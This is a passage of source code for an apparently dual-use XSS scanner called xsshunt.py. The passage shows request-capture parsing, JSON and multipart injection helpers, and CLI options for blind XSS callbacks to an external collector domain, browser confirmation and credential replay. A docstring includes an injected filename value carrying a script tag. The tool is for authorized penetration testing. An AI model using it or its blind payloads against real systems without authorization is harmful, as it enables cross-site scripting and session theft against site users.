        options --no-* : query (GET), path, en-têtes et DOM à l'identique ; le
        corps de la requête (paramètres POST) est représenté par un formulaire
        synthétique et passé par le vecteur form/POST habituel (--no-forms).
        Les en-têtes de la requête (Cookie, User-Agent...) sont déjà injectés
        dans le Requester par main(), donc rejoués sur chaque requête.
        """
        url = spec.url
        self.rep.banner(f"Scanning (requête brute) {spec.method} {url}")

        # La ligne de base doit être la requête capturée, corps compris : un
        # endpoint multipart répond 415 à tout le reste, et préflighter avec
        # un corps urlencodé ferait sauter l'URL entière avant le premier test.
        if spec.method == "POST" and spec.parts:
            pre_body = MultipartBody(spec.parts, spec.boundary)
        elif spec.method == "POST" and spec.json_body is not None:
            pre_body = JsonBody(json.dumps(spec.json_body))
        elif spec.method == "POST":
            pre_body = spec.body_params or None
        else:
            pre_body = None
        base = self.preflight(url, method=spec.method, data=pre_body)
        if base is None:
            return
        self.rep.info(f"{base.status} {base.header('Content-Type', '?')} "
                      f"{len(base.body)} bytes  ({base.elapsed:.2f}s)")
        self._report_baseline(url, base)

        csp = base.header("Content-Security-Policy")
        self.rep.info(f"CSP present: {csp[:160]}" if csp
                      else "no Content-Security-Policy header")

        page = parse_page(base.body)
        params = list(spec.query_params)

        # corps POST -> formulaire synthétique, réutilise le vecteur form/POST
        body_form = None
        if spec.parts:
            # Les parts capturées sont transportées telles quelles : octets,
            # nom de fichier et Content-Type par part. Les reconstruire à
            # partir d'un dict nom->valeur jetterait précisément ce qui fait
            # l'intérêt d'une capture.
            body_form = Form(action=url, method=spec.method,
                             enctype="multipart/form-data",
                             inputs={p.name: ("" if p.is_file else str(p.value))
                                     for p in spec.parts},
                             types={p.name: ("file" if p.is_file else "text")
                                    for p in spec.parts},
                             raw_parts=tuple(spec.parts),
                             boundary=spec.boundary)
            self.rep.info(
                "corps multipart : "
                + ", ".join(p.name + (" (file %s, %s)" % (p.filename, p.ctype)
                                      if p.is_file else "")
                            for p in spec.parts))
        elif spec.body_params:
            body_form = Form(action=url, method=spec.method,
                             enctype="application/x-www-form-urlencoded",
                             inputs=dict(spec.body_params),
                             types={k: "text" for k in spec.body_params})
            self.rep.info(f"corps {spec.method} : champs {list(spec.body_params)}")

        forms = ([body_form] if body_form else []) + page.forms
        params, forms, headers, cookies, only = self.select(url, params, forms)
        named = bool(self.wanted())

        self._tls.verified = 0
        try:
            if spec.json_body is not None and not self.args.no_json:
                self.test_json(url, spec.json_body, spec.method)
            if not self.args.no_reflected:
                for p in params:
                    self.test_query_param(url, p)
            if not self.args.no_path and not named:
                self.test_path(url)
            if not self.args.no_forms:
                for form in forms:
                    self.test_form(url, form, only)
            if headers or cookies:
                self.test_headers(url, headers, cookies)
            if not self.args.no_dom and not named:
                self.test_dom(url, page)

            self.test_blind(url, params, forms, headers, cookies, only)
        except _StopURL as e:
            self.rep.info(f"{url}: {e.args[0]} finding(s) confirmés en navigateur "
                          f">= --confirm-x ({self.args.confirm_x}) - tests restants "
                          f"ignorés pour cette URL")


# ----------------------------------------------------------------------------
# CLI
# ----------------------------------------------------------------------------

def normalize(u: str) -> str:
    if not u.startswith(("http://", "https://")):
        u = "https://" + u
    return u


def load_urls(path: str) -> list[str]:
    urls = []
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.strip()
            if line and not line.startswith("#"):
                urls.append(normalize(line))
    return urls


# ----------------------------------------------------------------------------
# Raw HTTP request (-r)
# ----------------------------------------------------------------------------

# En-têtes du fichier de requête à NE PAS renvoyer tels quels : urllib les
# calcule lui-même (Host depuis l'URL, Content-Length depuis le corps) ou ils
# casseraient l'analyse (Accept-Encoding: gzip -> corps compressé qu'urllib ne
# décode pas, donc plus aucune réflexion détectable).
_RAW_SKIP_HEADERS = frozenset({
    "host", "content-length", "connection", "proxy-connection", "keep-alive",
    "accept-encoding", "transfer-encoding", "te",
})


def rename_query_param(url: str, old: str, new: str) -> str:
    """Rename one query parameter, keeping its value and its position.

    Order matters: an application that reads the first occurrence of a name,
    or that cares where a parameter sits, must see the same request it would
    otherwise have seen apart from the one name under test.
    """
    parts = urllib.parse.urlsplit(url)
    pairs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    out = [((new if k == old else k), v) for k, v in pairs]
    return urllib.parse.urlunsplit(
        (parts.scheme, parts.netloc, parts.path,
         urllib.parse.urlencode(out), parts.fragment))


def rename_field(fields: dict, old: str, new: str) -> dict:
    """The same, for a body or form field."""
    return {(new if k == old else k): v for k, v in fields.items()}


class JsonBody(str):
    """A request body that is JSON, tagged so the encoder says so.

    A bare str body would be sent with no Content-Type and the application
    would never parse it.
    """

    @property
    def text(self):
        return str(self)


def json_leaves(node, prefix=""):
    """Every leaf of a JSON document, named by path and carrying its type.

    Returns [(path, value, kind)] with kind in "str"/"num"/"bool"/"null".
    A path reads like the operator would write it: filters.tags[0].

    Containers are not leaves: injecting into an object or a list replaces a
    structure with a string and the request stops being the request under
    test.
    """
    out = []
    if isinstance(node, dict):
        for k, v in node.items():
            out += json_leaves(v, "%s.%s" % (prefix, k) if prefix else str(k))
    elif isinstance(node, list):
        for i, v in enumerate(node):
            out += json_leaves(v, "%s[%d]" % (prefix, i))
    else:
        kind = ("str" if isinstance(node, str) else
                "bool" if isinstance(node, bool) else
                "null" if node is None else "num")
        out.append((prefix, node, kind))
    return out


_JSON_STEP = re.compile(r"([^.\[\]]+)|\[(\d+)\]")


def json_set(tree, path, value):
    """Set one leaf, by the same path shape json_leaves produces.

    The tree is copied, never mutated: the caller's document is the baseline
    for every other point and must survive the test.
    """
    tree = copy.deepcopy(tree)
    steps = [(m.group(1), m.group(2)) for m in _JSON_STEP.finditer(path)]
    node = tree
    for i, (key, idx) in enumerate(steps):
        last = i == len(steps) - 1
        if idx is not None:
            j = int(idx)
            if not isinstance(node, list) or j >= len(node):
                return tree
            if last:
                node[j] = value
            else:
                node = node[j]
        else:
            if not isinstance(node, dict) or key not in node:
                return tree
            if last:
                node[key] = value
            else:
                node = node[key]
    return tree


def json_rename(tree, path, new_name):
    """Rename the KEY at this path, keeping its value and its position.

    Only ever reached through --test-param-name: a renamed key is a different
    document, and most APIs answer a validation error rather than a
    reflection. It is a real surface -- an error page echoing the unknown
    field name -- but it is not the default one.
    """
    tree = copy.deepcopy(tree)
    steps = [(m.group(1), m.group(2)) for m in _JSON_STEP.finditer(path)]
    node = tree
    for i, (key, idx) in enumerate(steps):
        last = i == len(steps) - 1
        if idx is not None:
            j = int(idx)
            if not isinstance(node, list) or j >= len(node):
                return tree
            if last:
                return tree          # a list element has no name
            node = node[j]
        else:
            if not isinstance(node, dict) or key not in node:
                return tree
            if last:
                rebuilt = {}
                for k, v in node.items():
                    rebuilt[new_name if k == key else k] = v
                node.clear()
                node.update(rebuilt)
                return tree
            node = node[key]
    return tree


# ----------------------------------------------------------------------------
# multipart/form-data
# ----------------------------------------------------------------------------

@dataclass(frozen=True)
class Part:
    """One part of a multipart body.

    A urlencoded field is a name and a value. A multipart part is a name, a
    value and -- when it carries a file -- two pieces of metadata the
    urlencoded encoding simply cannot express:

        --boundary
        Content-Disposition: form-data; name="avatar"; filename="a.png"
        Content-Type: image/png

        <bytes>

    The filename and the per-part Content-Type reach code the value never
    touches. The value of a file part is bytes nobody renders; the filename is
    what the confirmation page prints back, and the Content-Type is what a
    validator names when it refuses the upload. They are separate injection
    points for the same reason a cookie is not a query parameter.
    """
    name: str
    value: object = ""              # str for a field, bytes for file content
    filename: str | None = None     # set => this part is a file part
    ctype: str | None = None        # per-part Content-Type

    @property
    def is_file(self) -> bool:
        return self.filename is not None


# The stand-in upload used for a file input found in an HTML form, where
# nothing says what the application expects. A GIF header rather than
# "test.txt" because extension and magic-byte checks are the common gate, and
# a part rejected before it is read tests nothing. A capture (-r) carries the
# real bytes and this is not used.
DEFAULT_UPLOAD = (b"GIF89a\x01\x00\x01\x00\x00\x00\x00;", "test.gif", "image/gif")


def _mp_escape(s: str) -> str:
    """Escape a name or filename for a Content-Disposition parameter.

    A raw quote would close the parameter early and the part would lose its
    name, turning a payload into a malformed request -- a test that measures
    the parser instead of the application. Percent-encoding is what RFC 7578
    asks for and what browsers send, and it round-trips: measured against
    Werkzeug, filename="a%22><script>.png" arrives as a"><script>.png while
    the raw quote truncates the name at the quote. Note what is NOT escaped --
    the angle brackets travel as themselves, because they are the payload.
    """
    return (s.replace("\\", "%5C").replace('"', "%22")
             .replace("\r", "%0D").replace("\n", "%0A"))


def _mp_unescape(s: str) -> str:
    for a, b in (("%5C", "\\"), ("%22", '"'), ("%0D", "\r"), ("%0A", "\n")):
        s = s.replace(a, b).replace(a.lower(), b)
    return s


class MultipartBody:
    """A request body made of parts, tagged so the encoder frames it.

    Carries its own boundary, because the Content-Type header has to name it.
    A body framed with one boundary and announced with another parses as zero
    parts: the server answers 200 with an empty form and the scan reads as
    clean. That is not hypothetical -- it is what this tool did with a
    captured multipart request before this class existed. The capture's
    Content-Type was replayed verbatim, the body was re-encoded as
    application/x-www-form-urlencoded, and every single test was a no-op that
    looked like a target with nothing wrong with it.
    """

    def __init__(self, parts, boundary: str | None = None):
        self.parts = tuple(parts)
        # The captured boundary is kept. It is part of the request as it was
        # observed, and replacing it would send something the application was
        # never seen to receive. One is generated only when there is none to
        # keep -- an HTML form, where the browser would generate one too.
        if boundary and not self._collides(boundary):
            self.boundary = boundary
        else:
            self.boundary = self._fresh()

    def _collides(self, boundary: str) -> bool:
        return any(boundary.encode() in self._raw(p) for p in self.parts)

    def _fresh(self) -> str:
        """A boundary that appears in none of the parts.

        Checked, not assumed. A payload is attacker-chosen text, and one
        carrying the boundary would open a part of its own -- the request
        would stop being the request under test, and whatever it then proved
        would be about the multipart parser. This is also the only reason a
        captured boundary is ever dropped.
        """
        while True:
            b = "----xsshunt" + rand_token(16)
            if not self._collides(b):
                return b

    @staticmethod
    def _raw(p: Part) -> bytes:
        head = "%s|%s|%s" % (p.name, p.filename or "", p.ctype or "")
        body = (p.value if isinstance(p.value, bytes)
                else str(p.value).encode("utf-8", "replace"))
        return head.encode("utf-8", "replace") + body

    def encode(self) -> bytes:
        out = []
        bound = b"--" + self.boundary.encode()
        for p in self.parts:
            head = ('Content-Disposition: form-data; name="%s"'
                    % _mp_escape(p.name))
            if p.filename is not None:
                head += '; filename="%s"' % _mp_escape(p.filename)
            if p.ctype:
                # A header value cannot carry CR or LF: left in, a payload
                # would inject a header rather than test the one it is in.
                head += "\r\nContent-Type: %s" % (
                    p.ctype.replace("\r", "").replace("\n", ""))
            val = (p.value if isinstance(p.value, bytes)
                   else str(p.value).encode("utf-8"))
            out.append(bound + b"\r\n" + head.encode("utf-8")
                       + b"\r\n\r\n" + val + b"\r\n")
        out.append(bound + b"--\r\n")
        return b"".join(out)

    @property
    def content_type(self) -> str:
        return "multipart/form-data; boundary=" + self.boundary

    @property
    def text(self) -> str:
        return self.encode().decode("utf-8", "replace")

    @property
    def debug_text(self) -> str:
        """The same body with file content elided.

        What a tester reads at -v 2 is the structure -- which part carries the
        payload, what the filename and the per-part type are. The file's bytes
        are noise there, and printing a real upload's megabyte through a
        terminal as replacement characters hides the one line that mattered.
        """
        shown = MultipartBody(
            [p if not isinstance(p.value, bytes)
             else Part(p.name, "<%d bytes>" % len(p.value), p.filename, p.ctype)
             for p in self.parts], self.boundary)
        return shown.text


def multipart_boundary(ctype: str) -> str:
    for tok in (ctype or "").split(";")[1:]:
        k, _, v = tok.partition("=")
        if k.strip().lower() == "boundary":
            return v.strip().strip('"')
    return ""


def parse_multipart(body: bytes, boundary: str) -> list:
    """Parse a captured multipart body into Parts.

    File content stays bytes and is never decoded: an endpoint that checks
    magic bytes would reject a round-tripped text version, and the scan would
    be measuring that rejection instead of the application.
    """
    out = []
    for chunk in body.split(b"--" + boundary.encode()):
        if not chunk.strip() or chunk.lstrip().startswith(b"--"):
            continue                       # preamble, or the closing epilogue
        chunk = chunk.lstrip(b"\r\n")
        head, sep, val = chunk.partition(b"\r\n\r\n")
        if not sep:
            head, sep, val = chunk.partition(b"\n\n")
            if not sep:
                continue
        if val.endswith(b"\r\n"):
            val = val[:-2]
        elif val.endswith(b"\n"):
            val = val[:-1]

        name = filename = ctype = None
        for ln in head.replace(b"\r\n", b"\n").split(b"\n"):
            k, _, v = ln.decode("utf-8", "replace").partition(":")
            k = k.strip().lower()
            if k == "content-disposition":
                for tok in v.split(";"):
                    tk, _, tv = tok.partition("=")
                    tv = tv.strip().strip('"')
                    if tk.strip().lower() == "name":
                        name = _mp_unescape(tv)
                    elif tk.strip().lower() == "filename":
                        filename = _mp_unescape(tv)
            elif k == "content-type":
                ctype = v.strip()
        if name is None:
            continue
        out.append(Part(name,
                        val if filename is not None
                        else val.decode("utf-8", "replace"),
                        filename, ctype))
    return out


def place_in_parts(parts, name: str, sent: str, attr: str = "value") -> list:
    """A copy of the part list with `sent` placed in one part's `attr`."""
    out = []
    for p in parts:
        if p.name != name:
            out.append(p)
        elif attr == "name":
            out.append(Part(sent, p.value, p.filename, p.ctype))
        elif attr == "filename":
            out.append(Part(p.name, p.value, sent, p.ctype))
        else:
            out.append(Part(p.name, sent, p.filename, p.ctype))
    return out


@dataclass
class RequestSpec:
    method: str
    url: str
    headers: dict                       # en-têtes à envoyer sur chaque requête
    query_params: list                  # noms des paramètres de la query string
    body_params: dict = field(default_factory=dict)  # corps urlencodé (nom->valeur)
    json_body: object = None            # corps JSON décodé, arbre complet
    parts: list = field(default_factory=list)        # corps multipart, parts intactes
    boundary: str = ""                  # boundary de la capture, conservé


def _infer_scheme(headers: dict) -> str:
    """http par défaut ; https si un Origin/Referer même-hôte est en https."""
    for h in ("Origin", "Referer"):
        v = headers.get(h) or headers.get(h.lower())
        if v and v.lower().startswith("https://"):
            return "https"
        if v and v.lower().startswith("http://"):
            return "http"
    return "http"


def parse_raw_request(path: str, force_ssl: bool = False) -> RequestSpec:
    """
    Parse un fichier au format requête HTTP brute (export Burp/ZAP) en une
    RequestSpec : méthode, URL absolue, en-têtes à rejouer, paramètres de query
    et de corps. Le schéma est http par défaut (déduit d'Origin/Referer, ou
    forcé en https avec --force-ssl) car une requête origin-form ne le porte pas.
    """
    with open(path, "rb") as fh:
        raw = fh.read()
    text = raw.decode("utf-8", errors="replace").replace("\r\n", "\n")
    # Le corps est aussi conservé en OCTETS : un corps multipart peut contenir
    # un fichier binaire, et le décoder en utf-8 avec remplacement le corrompt
    # sans rien dire.
    _sep = b"\r\n\r\n" if b"\r\n\r\n" in raw else b"\n\n"
    raw_body = raw.partition(_sep)[2]

    # tête / corps séparés par la première ligne vide
    head, _, body = text.partition("\n\n")
    lines = head.split("\n")
    while lines and not lines[0].strip():        # ignore lignes vides initiales
        lines.pop(0)
    if not lines:
        raise ValueError("fichier de requête vide")

    parts = lines[0].strip().split()
    if len(parts) < 2:
        raise ValueError(f"ligne de requête invalide : {lines[0]!r}")
    method, target = parts[0].upper(), parts[1]

    headers: dict = {}
    for ln in lines[1:]:
        if ":" in ln:
            k, _, v = ln.partition(":")
            if k.strip():
                headers[k.strip()] = v.strip()

    host = headers.get("Host") or headers.get("host")
    if target.startswith(("http://", "https://")):
        url = target
        if force_ssl and url.startswith("http://"):
            url = "https://" + url[len("http://"):]
    else:
        if not host:
            raise ValueError("pas d'en-tête Host et URI non absolue : "
                             "impossible de construire l'URL")
        scheme = "https" if force_ssl else _infer_scheme(headers)
        if not target.startswith("/"):
            target = "/" + target
        url = f"{scheme}://{host}{target}"

    # en-têtes à rejouer (nettoyés des hop-by-hop / calculés)
    fwd = {k: v for k, v in headers.items() if k.lower() not in _RAW_SKIP_HEADERS}

    q = urllib.parse.urlsplit(url).query
    query_params = list(dict.fromkeys(
        k for k, _ in urllib.parse.parse_qsl(q, keep_blank_values=True)))

    body_params: dict = {}
    parts: list = []
    body = body.strip()
    json_body = None
    ctype_raw = next((v for k, v in headers.items()
                      if k.lower() == "content-type"), "")
    ctype = ctype_raw.lower()
    if "multipart/form-data" in ctype:
        # Avant, cette branche n'existait pas et le corps tombait dans
        # looks_form : un corps multipart contient des "=" (name="x"), donc
        # parse_qsl le découpait en un faux champ dont le nom était une ligne
        # de délimiteur. Le Content-Type capturé était rejoué tel quel, le
        # corps réencodé en urlencoded, et le serveur lisait zéro part : 200,
        # zéro reflet, scan « propre ». La casse compte ici, le boundary est
        # sensible à la casse — d'où ctype_raw.
        bound = multipart_boundary(ctype_raw)
        if not bound:
            raise ValueError("multipart body: Content-Type carries no boundary")
        parts = parse_multipart(raw_body, bound)
        if not parts:
            raise ValueError(
                "multipart body: no part could be read with boundary %r — "
                "check the capture was saved raw, without re-wrapping"
                % bound)
    elif body:
        # urlencodé explicite, ou corps qui ressemble à k=v&k=v (et pas du JSON)
        looks_form = ("urlencoded" in ctype
                      or ("=" in body and not body.lstrip().startswith(("{", "["))))
        if looks_form:
            pairs = urllib.parse.parse_qsl(body, keep_blank_values=True)
            if pairs:
                body_params = dict(pairs)
        elif "json" in ctype or body.lstrip().startswith(("{", "[")):
            # Kept, not discarded. This branch used to recognise a JSON body
            # and then drop it: the scan ran with zero injection points and
            # said nothing, which is the worst way to miss a whole surface.
            try:
                json_body = json.loads(body)
            except ValueError as e:
                raise ValueError("body looks like JSON but does not parse: %s" % e)
    return RequestSpec(method, url, fwd, query_params, body_params, json_body,
                       parts, multipart_boundary(ctype_raw) if parts else "")


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="xsshunt.py",
        description="Test all forms of XSS: reflected, stored, form/POST, "
                    "header-based, DOM and blind (OOB).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""examples:
  xsshunt.py -u 'https://target/search?q=test'
  xsshunt.py -v 1 -u 'https://target/page?id=1'
  xsshunt.py -l urls.txt -v 1
  xsshunt.py -l urls.txt -b https://xss.collab.example
  xsshunt.py -u https://target/ -b https://xss.ht/abc -v 1 -t 10 -o report.json
  xsshunt.py -r request.txt -v 1
  xsshunt.py -r request.txt --headers --no-dom --force-ssl
  xsshunt.py -r request.txt -p cookie:lang
  xsshunt.py -l scope.txt --auth-dir ~/auth -v 1
  xsshunt.py -u 'https://app.example.com/s?q=x' --auth-file ~/auth/app.txt
  xsshunt.py -u 'https://target/search?q=test' -p query:q -x http://127.0.0.1:8080

authentication
  Most of an application's surface sits behind a login. --auth-file takes one
  file of headers (the -H syntax, '#' for comments) and applies it to every
  target whatever it is called; --auth-dir takes a directory of files named
  after the host they authenticate -- www.example.com.txt for every port of
  that host, www.example.com_8080.txt for that port only, which wins over it.
  The two are mutually exclusive. There is no subdomain inheritance: a file for
  example.com does not authenticate app.example.com, because credentials that
  follow a wildcard land on whatever subdomain happens to resolve, including
  one that has been taken over.

  This is also what -H cannot do. -H feeds one header dict shared by every
  target, so in -l mode a session given that way reaches every host in the
  list. The auth table is keyed by (host, port) and resolved per request, which
  is what makes it correct under -t and what stops the session crossing a
  redirect to another host.

  --confirm sees the same headers. The browser replay resolves them per URL
  the way the HTTP layer does, minus the rotating profile and minus the
  browser-managed headers of a capture (Sec-Fetch-*, Priority...), which
  Chromium sets for itself. Before that it read -H alone, so a session from an
  auth file or from a -r capture never reached the browser: the PoC loaded the
  login page, no dialog fired, and a finding the HTTP layer had just proved was
  reported unconfirmed.

  Priority, lowest first: the captured request (-r), the auth file, then -H.
  Cookie is merged cookie by cookie along that order rather than replaced, so a
  TrackingId from a capture survives a session= from an auth file. Nothing an
  auth file supplies is injected -- the payload would replace the credential
  and everything after it would run unauthenticated, which looks exactly like a
  clean target -- unless -p names it: -p cookie:session or -p header:User-Agent
  test it anyway. Credentials appear as-is in the PoC, the JSON report and
  -v 2, so the curl in a report is copy-paste reproducible.

injection points
  Query parameters, form fields and URL path segments by default; the POST
  body in -r mode. Request headers, cookies included, only with --headers --
  or one at a time by naming it with -p, which needs no flag. Cookies are
  tested ONE AT A TIME with the rest of the jar replayed intact, because a
  session cookie dropped alongside the payload costs the access the reflection
  needs. Nothing is guessed: a parameter name that is not in the request is
  tested only when -p names it. While -p is naming points, path and DOM
  testing are skipped -- neither is a named point.

  A ';' cannot travel in a cookie value: it ends it. The probe drops that one
  character on a cookie point and payloads carrying it are skipped, so what
  gets measured there is the application rather than the transport.

status line
  In -l mode a heartbeat prints every 30s (--status-interval) at any verbosity:
  URLs tested / total, remaining, and findings by confidence. Not shown for -u.

Use only against systems you are authorized to test.""")
    p.add_argument("-v", dest="verbose", type=int, nargs="?", const=1, default=0,
                   choices=[0, 1, 2],
                   help="verbosity: 0 = only successes (default), "
                        "1 = every test performed, 2 = debug (full request and "
                        "the exact payload sent, response status/size, and "
                        "payloads skipped as filtered)")
    p.add_argument("-u", dest="url", help="single URL to test")
    p.add_argument("-l", dest="list", help="file containing a list of URLs to test")
    p.add_argument("-r", dest="request", metavar="FILE",
                   help="fichier au format requête HTTP brute (export Burp/ZAP) : "
                        "méthode, en-têtes (Cookie...) et corps sont rejoués, et "
                        "les injections suivent les vecteurs habituels (query, "
                        "path, corps POST, en-têtes, DOM) selon les options --no-*")
    p.add_argument("--force-ssl", action="store_true",
                   help="forcer https pour une requête -r (défaut : http, déduit "
                        "d'Origin/Referer). Force aussi le schéma des payloads "
                        "OOB (-b) en https, quelle que soit la cible")
    p.add_argument("-b", dest="blind", metavar="DOMAIN",
                   help="OOB collector domain for blind XSS tests, e.g. "
                        "meoob.cc (skipped when omitted). Each injection point "
                        "gets its own hostname, xss-<token>.DOMAIN, so a "
                        "wildcard collector can attribute a hit from the DNS "
                        "query alone. The scheme mirrors the target (an http:// "
                        "callback is dropped as mixed content on an https "
                        "page); --force-ssl, or a scheme given here, overrides "
                        "it. Append :port for a non-standard port")

    p.add_argument("--dns-log", metavar="FILE",
                   help="path to your DNS server's log file; checked as a "
                        "plain substring match for each pending OOB token "
                        "(incrementally during the run, and once at the end), "
                        "confirming a blind XSS by DNS resolution alone - no "
                        "HTTP request and no reflection needed (requires -b)")
    p.add_argument("--http-log", metavar="FILE",
                   help="path to your HTTP server's log file; checked as a "
                        "plain substring match for each pending OOB token "
                        "(incrementally during the run, and once at the end). "
                        "The stronger of the two: a request that reached your "
                        "collector means the payload ran in a real browser "
                        "(requires -b)")

    p.add_argument("-t", "--threads", type=int, default=5,
                   help="concurrent URLs to scan (default 5)")
    p.add_argument("--timeout", type=float, default=10.0, help="request timeout (s)")
    p.add_argument("-d", "--delay", type=float, default=0.0,
                   help="minimum gap between requests (s), enforced globally "
                        "across all threads")
    p.add_argument("-H", "--header", action="append", default=[],
                   help="extra header 'Name: value' (repeatable) - also how to "
                        "set a Cookie or override the User-Agent")
    p.add_argument("-p", "--param", metavar="NAME",
                   help="only test the injection points named here, "
                        "comma-separated. A bare name matches wherever it is "
                        "found; prefix it to say where: query: (or get:, url:), "
                        "body: (or post:, data:), cookie:, header:, json: — "
                        "e.g. '-p cookie:lang,query:search'. A JSON leaf is "
                        "named by its path or by its last segment alone, so "
                        "'meta.bio' and 'bio' both reach it. A header named "
                        "this way is tested without --headers. A name the request "
                        "does not carry is created in the place the prefix "
                        "says (query string when there is none), so a "
                        "parameter you know about but that is not in the "
                        "capture can still be reached. Path and DOM testing "
                        "are skipped while -p is naming points")
    p.add_argument("-x", "--proxy", help="proxy URL, e.g. http://127.0.0.1:8080")
    p.add_argument("--auth-file", metavar="FILE",
                   help="headers to authenticate with, -H syntax, one per "
                        "line, '#' for comments. Applied to EVERY target "
                        "whatever the file is called")
    p.add_argument("--auth-dir", metavar="DIR",
                   help="directory of auth files named after the host they "
                        "authenticate: www.example.com.txt covers every port "
                        "of that host, www.example.com_8080.txt covers that "
                        "port only and wins over it. No subdomain inheritance. "
                        "Only the host a file names receives its headers, "
                        "which is what -H cannot do in -l mode. Mutually "
                        "exclusive with --auth-file")
    p.add_argument("-o", "--output", help="write JSON report to this file")
    p.add_argument("--status-interval", type=float, default=30.0, metavar="SEC",
                   help="seconds between status lines in -l mode (default 30)")
    p.add_argument("--max-scripts", type=int, default=10,
                   help="max external scripts to fetch per page (default 10)")
    p.add_argument("--no-reflected", action="store_true", help="skip reflected tests")
    p.add_argument("--no-forms", action="store_true", help="skip form tests")
    p.add_argument("--no-path", action="store_true",
                   help="skip URL path injection tests")
    p.add_argument("--max-path-segments", type=int, default=3,
                   help="how many trailing path segments to inject into "
                        "(default 3, plus one appended segment)")
    p.add_argument("--headers", action="store_true",
                   help=f"also inject into request headers, in every mode "
                        f"including -r: the {len(INJECTABLE_HEADERS)} listed "
                        f"ones (User-Agent, Referer, X-Forwarded-For, ...) and "
                        f"every cookie the request carries, one at a time. Off "
                        f"by default because it multiplies the request budget "
                        f"by the number of headers; -p header:NAME or "
                        f"-p cookie:NAME tests one of them without this flag")
    p.add_argument("--no-cookies", action="store_true",
                   help="with --headers, test the listed headers but not the "
                        "cookies")
    p.add_argument("--no-dom", action="store_true", help="skip DOM analysis")
    p.add_argument("--no-json", action="store_true",
                   help="skip JSON body tests")
    p.add_argument("--test-param-name", action="store_true",
                   help="also inject into parameter and key NAMES, not just "
                        "their values. Off by default: renaming a field "
                        "usually buys a validation error rather than a "
                        "reflection. Covers query parameters, body/form "
                        "fields, JSON keys, multipart part names and upload "
                        "FILENAMES; --replace does not reach it, a name "
                        "having no value to keep. A filename keeps its "
                        "extension, validators gate on it, and its payloads "
                        "are sent whether or not the probe came back -- an "
                        "upload rarely echoes anything into the response it "
                        "answers with, so -b is what catches this one")
    p.add_argument("--no-sql", action="store_true",
                   help="don't alert on SQL errors found in responses")
    p.add_argument("--replace", dest="append", action="store_false", default=True,
                   help="overwrite the parameter instead of appending the "
                        "payload to its current value (default: append)")
    p.add_argument("--confirm", action="store_true",
                   help="confirm each finding in a headless browser (Playwright/"
                        "Chromium): reproduces it and flags [CONFIRMED] if the "
                        "payload's alert() actually fires. A GET is navigated; "
                        "a POST body -- form fields and multipart parts alike "
                        "-- is replayed with a self-submitting form from the "
                        "target's own origin, so the session cookies travel. "
                        "A JSON body cannot be reproduced this way and says so "
                        "on the finding. With -b it also "
                        "replays the planted blind payloads that came back in "
                        "the response, which is what fires them and sends the "
                        "callback (see --no-blind-confirm). Install: "
                        "`pip install playwright && playwright install chromium`")
    p.add_argument("--confirm-timeout", type=float, default=8.0, metavar="SEC",
                   help="per-finding browser confirmation timeout (default 8)")
    p.add_argument("--confirm-x", type=int, default=3, metavar="N",
                   help="stop testing a URL once N findings are browser-confirmed "
                        "(default 3). No effect without --confirm.")
    p.add_argument("--no-blind-confirm", action="store_true",
                   help="with --confirm and -b, don't replay the planted blind "
                        "payloads in the browser. Replaying is what makes a "
                        "reflected blind payload actually call your collector; "
                        "disable it to keep the collector free of your own "
                        "traffic (only real victims then show up).")
    p.add_argument("--no-color", action="store_true", help="disable ANSI colors")
    p.add_argument("--version", action="version", version=f"%(prog)s {VERSION}")
    return p


def collect_targets(args) -> list[str] | None:
    urls = []
    if args.url:
        urls.append(normalize(args.url))
    if args.list:
        if not os.path.isfile(args.list):
            print(f"error: no such file: {args.list}", file=sys.stderr)
            return None
        urls.extend(load_urls(args.list))
    return list(dict.fromkeys(urls))


def run_scans(scanner: Scanner, urls: list[str], rep: Reporter, args,
              status: Status):
    """Drive the scan, serially or across a pool, counting completions."""
    def one(u):
        try:
            scanner.scan(u)
        except Exception as e:
            rep.error(f"{u}: {e}")
        finally:
            status.host_done()

    if args.threads > 1 and len(urls) > 1:
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
            list(ex.map(one, urls))
    else:
        for u in urls:
            one(u)


def print_summary(scanner: Scanner, req: Requester, urls, elapsed, args):
    by = {k: [f for f in scanner.findings if f.confidence == k]
          for k in ("confirmed", "potential", "planted", "alert", "oob")}
    c = Colors
    print(f"\n{c.BOLD}--- summary ---{c.RESET}")
    print(f"targets      : {len(urls)}")
    if scanner.skipped:
        print(f"{c.YELLOW}skipped      : {len(scanner.skipped)} "
              f"(no usable response after {PREFLIGHT_TRIES} tries){c.RESET}")
        for s in scanner.skipped:
            print(f"               - {s['url']}  [{s['reason']}]")
    print(f"tests sent   : {scanner.tested} (HTTP requests: {req.count})")
    print(f"duration     : {elapsed:.1f}s")
    print(f"{c.GREEN}confirmed    : {len(by['confirmed'])}{c.RESET}")
    if args.confirm:
        # Only what Chromium proved itself: a callback found in a log was
        # fired by someone else's browser, and counting it here would credit
        # the wrong mechanism.
        nverif = sum(1 for f in scanner.findings
                     if f.verified and f.confidence != "oob")
        print(f"{c.CYAN}browser-confirmed: {nverif} (executed in headless Chromium){c.RESET}")
    if by["oob"]:
        print(f"{c.MAGENTA}{c.BOLD}OOB callbacks: {len(by['oob'])} "
              f"(vus dans vos logs de collecteur){c.RESET}")
    print(f"{c.YELLOW}potential    : {len(by['potential'])}{c.RESET}")
    if by["alert"]:
        print(f"{c.RED}SQL errors   : {len(by['alert'])} "
              f"({len({f.param for f in by['alert']})} parameter(s) - "
              f"check for SQLi){c.RESET}")
    if args.blind and scanner.blind_map:
        print(f"blind planted: {len(by['planted'])} injection point(s) - "
              f"watch {blind_collector(args.blind)[1]} (DNS or HTTP) "
              f"for callbacks")
        print(f"\n{c.BOLD}--- blind XSS map (callback hostname -> injection "
              f"point) ---{c.RESET}")
        width = max((len(m["host"]) for m in scanner.blind_map.values()),
                    default=0)
        for meta in scanner.blind_map.values():
            got = meta.get("callback")
            mark = (f"{c.MAGENTA}{c.BOLD}<- {'+'.join(got)}{c.RESET}"
                    if got else "")
            print(f"  {meta['host']:<{width}}  {meta['method']:4s} "
                  f"{meta['kind']:6s} {meta['param']}  {meta['url']} {mark}")
        if args.dns_log or args.http_log:
            quiet = sum(1 for m in scanner.blind_map.values()
                        if not m.get("callback"))
            if quiet:
                # Blind XSS often fires when someone opens the page, which can
                # be hours away. Silence at the end of a scan is not a verdict.
